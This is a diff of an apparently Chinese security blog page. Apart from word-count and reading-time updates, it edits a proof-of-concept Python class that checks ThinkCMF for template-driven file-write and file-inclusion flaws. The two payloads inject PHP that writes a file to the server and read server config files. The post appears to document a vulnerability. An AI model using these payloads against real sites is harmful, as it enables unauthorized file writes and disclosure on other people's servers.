@@ -431,14 +431,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        839
+                        838
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        3 分
                     </div>
                     
                 
@@ -524,7 +524,7 @@ class DemoPOC(POCBase):
         result = {}
         payload1 = &#39;?a=fetch&amp;templateFile=public/index&amp;prefix=%27%27&amp;content=&lt;php&gt;file_put_contents(%27test.php%27,&#39; \
                    &#39;%27hello world!%27)&lt;/php&gt; &#39;
-        payload2 = &#39;?a=display&amp;templateFile=config.yaml&#39;
+        payload2 = &#39;?a=display&amp;templateFile=Nginx.conf&#39;
         path1 = self.url + payload1
         path2 = self.url + payload2
 
@@ -536,7 +536,7 @@ class DemoPOC(POCBase):
             result[&#39;VerifyInfo&#39;] = {}
             result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url
             result[&#39;VerifyInfo&#39;][&#39;VUL1&#39;] = &quot;目标存在文件写入漏洞&quot;
-        if &#39;name: thinkcmf&#39; in respose3.text:
+        if &#39;location&#39; in respose3.text:
             result[&#39;VerifyInfo&#39;][&#39;VUL2&#39;] = &quot;目标存在文件包含漏洞&quot;
 
         return self.parse_output(result)
@@ -1290,7 +1290,7 @@ Ng
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">25.6k</span>
+                <span class="white-color">25.7k</span>
             
 
             
